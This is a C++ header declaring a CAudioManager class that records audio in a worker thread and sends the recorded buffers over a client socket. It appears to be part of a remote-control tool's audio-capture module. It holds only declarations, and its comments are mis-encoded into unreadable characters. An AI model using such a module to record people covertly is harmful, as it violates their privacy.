// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__C21DC7A1_D76D_4FE7_88FC_02A246B4D83A__INCLUDED_)
#define AFX_AUDIOMANAGER_H__C21DC7A1_D76D_4FE7_88FC_02A246B4D83A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"


#include "Audio.h"
class CAudioManager  : public CManager  
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
	bool CAudioManager::Initialize();
	void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize);
	int CAudioManager::SendRecordBuffer();
	static DWORD WINAPI WorkThread(LPVOID lparam);
	static bool m_bIsWorking;           //�ж��߳��Ƿ��ڹ���  ע���ʼ��
	CAudio	*m_lpAudio;                 //��Ƶ¼�Ƶ���
	HANDLE	m_hWorkThread;              //¼���߳�

};

#endif // !defined(AFX_AUDIOMANAGER_H__C21DC7A1_D76D_4FE7_88FC_02A246B4D83A__INCLUDED_)
